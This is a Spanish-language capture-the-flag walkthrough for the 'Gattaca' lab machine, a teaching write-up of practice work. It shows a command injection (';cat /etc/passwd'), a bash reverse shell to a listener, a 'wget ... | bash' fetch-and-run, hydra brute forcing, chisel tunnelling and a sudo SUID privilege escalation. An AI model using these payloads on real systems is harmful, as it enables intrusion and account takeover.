---
description: 'Difficulty: Hard'
---

# Gattaca

* En esta máquina al iniciarla podemos ver la IP:

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

### Recon

1. Empezaremos realizando un escaneo completo de nmap sobre el objetivo:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.107
```

<figure><img src="../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

* Vemos el puerto 80 ejecutando un servidor web Apache.

2. Accedemos desde el navegador:

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

3. Investigamos el código fuente en busca de algún enlace o archivo que nos pueda ser útil:

<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

* Pero no encontramos nada interesante.

4. Utilizaremos gobuster para descubrir directorios que puedan existir en el dominio:

```bash
gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
```

<figure><img src="../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

* Entre los directorios que se identifican, hay uno que no es “típico” que sería el directorio /cards/.

5. Probamos a entrar desde el navegador web a este directorio:

<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

* Aparece un Forbidden.

6. Seguimos explorando la web de la máquina y hay un menú lateral con diferentes enlaces:

<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

* Uno es el about.html, que está enlazado en el botón central de la página y el otro cards.php que comparte nombre con el directorio que se ha descubierto.

7. Al hacer click en cards.php, aparece un inicio de sesión para el que no tenemos credenciales:

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

### Brute Force

8. Cómo no disponemos de credenciales, haremos un ataque de fuerza bruta sobre cards.php:

```bash
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://192.168.56.107/cards.php -V -I -f -t 4 -w 5
```

<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

9. Accedemos con las credenciales a cards.php:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

### LFI

10. Hacemos submit de las cards disponibles, pero no vemos nada relevante. Vamos a capturar la request con Burp para ver como funciona por detrás:

<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

* No muestra nada relevante.

11. En el filename, en vez de introducir uno de los que nos da en el listado, vamos a introducir el propio cards.php a ver que nos devuelve:

<figure><img src="../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

* Con este output confirmamos que hay una especie de blacklist definida y que, lo que se hace, es ejecutar el comando cat para mostrar el contenido del fichero.

12. Una prueba bastante fácil y típica, es cambiar el método a ver si conseguimos bypassear la blacklist, si con POST no funciona, lo haremos con GET:

<figure><img src="../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

* Nos devuelve el contenido de cards.php.

13. Cómo el cambio de método ha funcionado, probaremos a mostrar un archivo sensible:

<figure><img src="../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

* Para codificar en URL en Burp, seleccionamos el texto y hacemos Ctrl+U, en este caso en filename=;cat /etc/passwd y vemos que nos muestra el contenido.

14. El binario cat se ejecuta y se muestran archivos a través de peticiones GET. Probaremos otros comandos a ver si tenemos RCE:

<figure><img src="../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

* Tenemos confirmación de que hay RCE.

### Reverse Shell

15. Cómo tenemos RCE, el siguiente paso para conseguir acceso al objetivo, será ejecutar una reverse shell y recibirla en la máquina atacante.
16. Generamos un archivo con la reverse shell:

```bash
/bin/bash -i >& /dev/tcp/192.168.56.101/1234 0>&1 
```

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

17. Levantamos un servidor http para ofrecer el archivo al sistema víctima:

```bash
python3 -m http.server 80
```

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

18. Ponemos una consola a la escucha:

```bash
nc -vnlp 1234
```

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

19. Enviamos la solicitud desde Burp para descargar la reverse\_shell:

```bash
wget -O - 192.168.56.101/reverse_shell|bash
```

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

* Recibimos la conexión para la descarga del archivo:

<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

* Y en la consola a la escucha, recibimos la conexión de la reverse\_shell:

<figure><img src="../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

20. Nos movemos por los directorios, en el directorio anterior encontramos el archivo ftppolicy.txt y lo mostramos:

<figure><img src="../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

* Nos dice el propio archivo que no probemos con v.freeman, que es uno de los usuarios que se podían ver en el /etc/passwd, ni fuerza bruta con la wordlist rockyou.txt.

21. Con las pistas del archivo ftppolicy.txt, concluimos que el objetivo es el usuario i.cassini:

<figure><img src="../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

* Cómo no podemos usar rockyou.txt en fuerza bruta, tendremos que probar por otras vías.

22. Lo que sabemos de momento:

    1\) Es el usuario para el login FTP.

    2\) Es el usuario i.cassini

    3\) Mínimo de 8 carácteres, contiene números y carácteres especiales.
23. Intentamos indagar en el directorio del usuario i.cassini a ver que sacamos:

<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

* Pero estamos en un callejón sin salida.

### Privilege Escalation

24. Hacemos un poco de OSINT y vemos que el usuario está basado en uno de los personajes de la película Gattaca, el nombre de la máquina (no conocía esta película, es literalmente del año que nací, perdón)

<figure><img src="../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

25. Parece un dato irrelevante, pero esto nos permitirá elaborar un diccionario con la herramienta cupp, que sirve para hacer un diccionario con unas pocas preguntas sobre el objetivo:

<figure><img src="../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

* Hemos creado el diccionario irene.txt dándole la información que tenemos.

26. Sabemos que podemos subir y ejecutar binarios. Haremos un port forwarding utilizando chisel, ya que necesitamos acceso al puerto FTP y sólo está disponible de forma local:

* Instalación chisel:

```bash
sudo apt install chisel-common-binaries
```

<figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

* Iniciamos el servidor en la máquina atacante:

```bash
chisel server --reverse -p 8000
```

<figure><img src="../../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

* Desde la reverse\_shell nos aseguramos de los puertos locales abiertos para hacer el forwarding, en este caso del 21 (FTP):

```bash
ss - ltn
```

<figure><img src="../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

* En la reverse\_shell descargamos el binario de chisel desde nuestra máquina atacante:

```bash
base64 /usr/bin/chisel > chisel.b64
```

* Y lo traspasamos como anteriormente la reverse\_shell con la request de Burp:

```bash
wget http://192.168.56.101:8001/chisel.b64 -O /tmp/chisel.b64
```

<figure><img src="../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

* Lo localizamos en el directorio /tmp/, lo decodificamos, le damos permisos y lo ejecutamos:

```bash
base64 -d /tmp/chisel.b64 > /tmp/chisel
chmod +x /tmp/chisel
ls -l /tmp/chisel
```

<figure><img src="../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

* Nos aseguramos de que el archivo chisel se transmite correctamente teniendo el mismo tamaño que en la máquina atacante y que no se queda a 0 de tamaño al decodificarlo.
* Ejecutamos chisel desde la consola que tenemos con la reverse shell:

```bash
/tmp/chisel client 192.168.56.101:8000 R:10021:127.0.0.1:21
```

<figure><img src="../../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

* En la consola del atacante donde hemos ejecutado el servidor chisel veremos lo siguiente que confirma que se realiza la conexión:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

27. Después de ejecutar el comando de forwarding, desde nuestra máquina víctima podremos hacer el ataque desde hydra:

```bash
hydra -l i.cassini -P /home/l4nk0n3/gattaca/cupp/irene.txt 127.0.0.1 -s 10021 ftp -VI -f -t 16
```

<figure><img src="../../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

* Encontramos la contraseña para el usuario i.cassini:

<figure><img src="../../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

28. Ahora que sabemos la contraseña del usuario i.cassini, vamos a ver de que tiene permisos el usuario:

```bash
su i.cassini
sudo -l
```

<figure><img src="../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

29. Hemos escalado al usuario i.cassini, vemos que el usuario puede utilizar el comando /usr/bin/acr, vamos a ver su manual/ayuda:

<figure><img src="../../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

* Nos establecemos un terminal para movernos más fácilmente:

```bash
script /dev/null -c bash
```

<figure><img src="../../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

30. Nos movemos entre los directorios y salimos del directorio de gattaca para ver que hay, encontramos la flag del usuario:

<figure><img src="../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

31. Seguimos tirando hacia atrás en los directorios hasta que llegamos a la raíz e intentamos entrar en el root pero no tenemos permiso:

<figure><img src="../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

* Aquí entra en juego el ejecutable que estabamos viendo antes.

32. Con el ejecutable /usr/bin/acr del que hemos mostrado la ayuda, vamos a intentar ver el contenido del archivo que haya dentro del directorio /root:

* Después de muchas pruebas (ejecutar un script con /usr/bin/acr con comandos en su interior para ejecutar sobre root, etc), al final utilizando la opción de debug (-d) y probando la ruta más sencilla damos con la flag del root:

```bash
sudo /usr/bin/acr -d /root/root.txt
```

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

* Se nos muestran errores, pero la flag es el código que se muestra.

33. Por último, aunque ya tenía el contenido de las flags, quería llegar a tener el root, que es el objetivo final de toda máquina, así que siguiendo el writeup de **suraxddq**, vi que la escalada de privilegios se hacía de la siguiente manera:

```bash
i.cassini@gattaca:~$ touch Makefile && chmod +x Makefile
i.cassini@gattaca:~$ echo "chmod 4777 /bin/bash" > Makefile 
i.cassini@gattaca:~$ sudo /usr/bin/acr -r Makefile 
error: this is not an acr generated configure script.
i.cassini@gattaca:~$ bash -p
bash-5.2# cd
bash-5.2# whoami;hostname;cut -c 1-5 root.txt 
root
gattaca
bd106
```
